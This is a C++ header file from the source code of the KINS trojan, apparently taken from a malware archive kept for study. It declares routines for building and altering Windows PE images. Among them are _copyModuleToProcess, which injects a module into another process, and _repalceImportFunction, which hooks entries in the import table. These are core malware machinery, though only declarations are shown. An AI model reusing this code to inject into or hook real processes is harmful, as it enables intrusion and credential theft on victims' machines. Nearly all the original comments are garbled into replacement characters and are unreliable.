/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ PE ������. 

  FIXME: �������� ����� � ������ ������ ���������.


*/
#pragma once

#if !defined PEIMAGE_32
#  error PEIMAGE_32 not defined!
#endif

#if !defined PEIMAGE_64
#  error PEIMAGE_64 not defined!
#endif

namespace PeImage
{
  enum
  {
    MAX_FILE_ALIGMENT    = (64 * 1024), //����. ������������ ��� FileAligment.
    MIN_FILE_ALIGMENT    = 512,         //���. ������������ ��� FileAligment.
    MAX_VIRTUAL_ALIGMENT = (64 * 1024), //����. ������������ ��� SectionAligment.
    MIN_VIRTUAL_ALIGMENT = 512,         //���. ������������ ��� SectionAligment.
  };
  
  //��������� ��� VS_VERSION_INFO. �� ������ VS_VERSIONINFO.
  typedef struct
  {
    WORD length;
    WORD valueLength;
    WORD type;
    WCHAR key[16];
    VS_FIXEDFILEINFO vsf;
  }VERSIONINFO_HEADER;

  typedef struct
  {
    WORD length; 
    WORD valueLength; 
    WORD type; 
    WCHAR key[1]; 
  }VERSIONINFO_VAR;

  //��������� ��� �������� ������ � �����.
  typedef struct
  {
    WORD machine;                     //��� �����. IMAGE_FILE_MACHINE_I386/IMAGE_FILE_MACHINE_AMD64.
    IMAGE_DOS_HEADER *dosHeader;      //DOS-���������.
    union
    {
#     if(PEIMAGE_32 > 0)
      IMAGE_NT_HEADERS32 *p32;         //NT32-���������.
#     endif
#     if(PEIMAGE_64 > 0)
      IMAGE_NT_HEADERS64 *p64;         //NT64-���������.
#     endif
    }ntHeader;

    IMAGE_DATA_DIRECTORY dataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //..
    
    WORD sectionsCount;              //���������� ������
    IMAGE_SECTION_HEADER *sections;  //������.
    LPBYTE *sectionsRawData;         //���������� ������.
    DWORD *sectionsFlags;            //���������������� ����� ������, ����� PeImage �� ������������.
    DWORD minimalRawOffsetOfSection; //����������� RAW ������� ������ ������ � ������. 0 ���
                                     //������ FileAlignment.
  }PEDATA;

  //������� ������ ��� NT-���������. ��� ���������� ����������� ������������� ���������� ��
  //IMAGE_NT_HEADERS
  typedef struct
  {
    DWORD   timeDateStamp;
    WORD    characteristics;
    BYTE    majorLinkerVersion;
    BYTE    minorLinkerVersion;
    DWORD64 imageBase;
    DWORD   sectionAlignment;
    DWORD   fileAlignment;
    WORD    majorOperatingSystemVersion;
    WORD    minorOperatingSystemVersion;
    WORD    majorImageVersion;
    WORD    minorImageVersion;
    WORD    majorSubsystemVersion;
    WORD    minorSubsystemVersion;
    WORD    subsystem;
    WORD    dllCharacteristics;
    DWORD64 sizeOfStackReserve;
    DWORD64 sizeOfStackCommit;
    DWORD64 sizeOfHeapReserve;
    DWORD64 sizeOfHeapCommit;
  }PENTBASEDATA;
  
  enum
  {
    BIF_CHECKSUM      = 0x1, //���������� ���������.
    BIF_NO_RECALC_RVA = 0x2, //�� ������������� ����������� ������, � ��� ������ �������� � ����.
                             //������������� ����� ����� ����� �������� � ����� ������, ���� 
                             //��������� ����� ������ ��� ������ � ����������� ������.
  };

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������� ������� ������.

    OUT pedata - ��������� ��� �������� ������.
    IN machine - ��� ���������. IMAGE_FILE_MACHINE_I386 ��� IMAGE_FILE_MACHINE_AMD64.
    
    Return     - true  - � ������ ������,
                 false - � ������ ������.
  */
  bool _createEmpty(PEDATA *pedata, WORD machine);

  /*
    �������� ������ �� ������. ������ ����������� �� ������.

    OUT pedata  - ��������� ��� �������� ������.
    IN mem      - ��������� �� ������.
    IN memSize  - ������ ������, ����� ������� MAXDWORD, �� ���� ����� ����� ������, ��� �����
                  �������� � ����������.
    IN isModule - ���������� ������ ��� ���������� ������.

    Return      - ����� ����� ������ - � ������ ������,
                  NULL - � ������ ������.
  */
  void *_createFromMemory(PEDATA *pedata, void *mem, DWORD memSize, bool isModule);

  /*
    ������������ ������.

    IN pedata - ����� ��� ������������.
  */
  void _freeImage(PEDATA *pedata);

  /*
    ������������� DOS-��������� ��� ������.

    IN OUT pedata - ����� ��� ���������.
    IN dosHeader  - DOS-���������, ��������� ������ ���� ������� ��������� e_magic � e_lfanew.

    Return        - true  - � ������ ������,
                    false - � ������ ������.
  */
  bool _setDosHeader(PEDATA *pedata, void *dosHeader);

  /*
    ������������� NT-��������� � ������ ������� ���������.

    IN OUT pedata - ����� ��� ���������.
    IN basedata   - ������� ������.

    Return        - true  - � ������ ������,
                    false - � ������ ������.    
  */
  bool _setNtHeader(PEDATA *pedata, PENTBASEDATA *basedata);

  /*
    ������������� NT-��������� ��������� ������� ������������ ���������. ����� ���������
    PEDATA.DataDirectory.

    IN OUT pedata - ����� ��� ���������.
    IN ntHeader   - ��������� �� IMAGE_NT_HEADERS32 ��� IMAGE_NT_HEADERS64. ��������� ������ ����
                    ����������.

    Return        - true  - � ������ ������,
                    false - � ������ ������.    
  */
  bool _setNtHeaderFromNtHeader(PEDATA *pedata, void *ntHeader);

  /*
    ���������� ������.

    IN OUT pedata      - ����� ��� ���������.
    IN name            - �������� ������, �� ����� IMAGE_SIZEOF_SHORT_NAME ��������.
    IN characteristics - ������ IMAGE_SECTION_HEADER.Characteristics.
    IN data            - ���������� ������.
    IN dataOffset      - ������� ������ � RAW (PointerToRawData). �� ����� ������ ��� _buildImage().
    IN dataSize        - ������ pData. ������������� ����������� �� FileAligment ��� ������.
    IN virtualAddress  - RVA ������, �� ����� ������ �� ����� ������ �� ������� ����� �����������.
    IN virtualDataSize - ����������� ������ ������. ����� �����, ����� ���� �� ��������� �� 
                         SectionAligment. �� ���� ������������ SizeOfInitializedData � 
                         SizeOfUninitializedData.
    IN flags           - ���������������� ����� ������.
    
    Return             - true  - � ������ ������,
                         false - � ������ ������.
  */
  bool _addSection(PEDATA *pedata, LPSTR name, DWORD characteristics, void *data, DWORD dataOffset, DWORD dataSize, DWORD virtualAddress, DWORD virtualDataSize, DWORD flags);

  /*
    ��������� ������� ������ �� �� �����.

    IN pedata - �����.
    IN name   - ��� ������ � ������ ��������.

    Return    - -1 - ���� ������ �� �������, ��� ������ � ������ ������.
  */
  int _getSectionIndexByName(PEDATA *pedata, LPSTR name);
  
  /*
    ��������� ������ ��� DataDirectory.

    IN OUT pedata     - ����� ��� ���������.
    IN index          - ���� �� �������� IMAGE_DIRECTORY_ENTRY_*.
    IN virtualAddress - RVA-�����.
    IN size           - ����������� ������.

    Return            - true  - � ������ ������,
                        false - � ������ ������.
  */
  bool _setDataDirectory(PEDATA *pedata, BYTE index, DWORD virtualAddress, DWORD size);

  /*
    ������ ������. ������ ������ ����������� ��������� � ������� MS Linker 9.0.

    IN pedata          - ����� ��� ���������.
    IN flags           - ����� BIF_*.
    IN rvaOfEntryPoint - RVA ����� �����. ���� 0, �������� ������� �� pedata.
    OUT output         - ����� ��� ��������� ������. ���� ����� NULL, ����������� ��� ���������
                         ������ pedata (������, RVA ������ � �.�.).

    Return             - 0 - � ������ ������, ��� ������ ������ � ������ ������.
  */
  DWORD _buildImage(PEDATA *pedata, DWORD flags, DWORD rvaOfEntryPoint, LPBYTE *output);
  
  /*
    ������������ RVA ��������� ������, ��� ����� IMAGE_SECTION_HEADER.PointerToRawData.

    IN pedata        - ����� ��� ���������.
    IN sectionsCount - ����������������� ���������� ������ � ������, ����� ����� ���������
                         ��� ��������.

    Return           - RVA ������ � ������ ������,
                       0 - � ������ ������.
  */
  DWORD _calcNextSectionRva(PEDATA *pedata, DWORD sectionsCount);

  /*
    ������� �������� RAW ������� ������.
    
    IN pedata - ����� ��� ���������.

    Retunrn   - ������ ������.
  */
  DWORD _getCurrentRawSize(PEDATA *pedata);

  /*
    ������� RAW ������� ������.
    
    IN image - ����� ��� ���������. ������������ ������ �� �����������.

    Retunrn  - ������ ������.
  */
  DWORD _getRawSize(const void *image);
  
  /*
    ������� �������� Virtual ������� ������, ��� ����� IMAGE_SECTION_HEADER.VirtualAddress.

    IN pedata - ����� ��� ���������.

    Retunrn   - ������ ������.
  */
  DWORD _getCurrentVirtualSize(PEDATA *pedata);

  /*
    Getting number of sections
	
	Return - number of sections
  */
  DWORD _getNumberOfSections(HMODULE module);
  /*
    ��������� ������ �� ����������� ������.
  
    IN hModule      - ������.
    IN wIndex       - ������ ������.
    OUT virtualSize - ����������� ������ ������, ����� ���� NULL.

    Return          - NULL - � ������ ������, ��� ����� ������ � ������ ������.

    ��������: ������������ � ����������� ������ �� �����������.
  */
  void *_getSectionOfModule(HMODULE module, WORD index, LPDWORD virtualSize);

  /*
    ��������� ��������� ������ �� �� �����.

    IN image       - ����� (RAW/VA).
    IN sectionName - ��� ������ ��� ������.

    Return         - ����� ��������� ������, ��� NULL - � ������ ������.
  */
  IMAGE_SECTION_HEADER *_getSectionByName(const void *image, const LPSTR sectionName);

  /*
    ����������� ������ � ������ ������� � ����������� �������. ������� ���������, � �� ���������
    ���� �������, ��� �� ��� ������� �������� ������ ���� �������� ��� �������, ����� �������
    ������ ������.

    IN process - �������, � ������� ����� ������������� �����������. ����� �����
                 PROCESS_VM_OPERATION | PROCESS_VM_WRITE
    IN image   - ����� ��� �����������, � ������� ��������.

    Return     - ����� ������ � �������� process, ��� NULL � ������ ������.
  */
  void *_copyModuleToProcess(HANDLE process, void *image);

  /*
    �������� ������� �������.

    IN image          - �����, � ������� ����� ������������� ���������.
    IN loadLibraryA   - ��������� �� ������� LoadLibraryA.
    IN getProcAddress - ��������� �� ������� GetProcAddress.

    Return            - true  - � ������ ������,
                        false - � ������ ������.
  */
  bool _loadImport(void *image, void *loadLibraryA, void *getProcAddress);

  /*
    ������ ������ � ������� �������.

    IN image       - �����, � ������� ����� ������������� ���������.
    IN oldFunction - ����� ������� �������.
    IN newFunction - ����� ����� �������.

    Return         - true  - � ������ ������,
                     false - � ������ ������.       
  */
  bool _repalceImportFunction(void *image, const void *oldFunction, const void *newFunction);

  /*
    ���������� RVA � RSA.

    IN pedata       - ����� ��� ���������.
    IN rva          - RVA.
    IN sectionIndex - ������ ������, ������� ����������� ������. ��� NULL ���� ������ ��
                      ���������.

    Return          - ����� ������������ ������ dwSectionIndex, ��� 0 � ������ ������.
  */
  DWORD _rvaToRsa(PEDATA *pedata, DWORD rva, LPWORD sectionIndex);

  /*
    ��������� �������� �� ����� ����������.

    IN mem     - �����.
    IN memSize - ������ ������.

    Return     - true  - � ������ ������,
                 false - � ������ ������.       
  */
  bool _isPeImage(void *mem, DWORD memSize);

  void normalizeRelocs(void* image, void* OldDelta, void* Delta);

  DWORD createNtCheckSum(LPBYTE image, DWORD size);
};
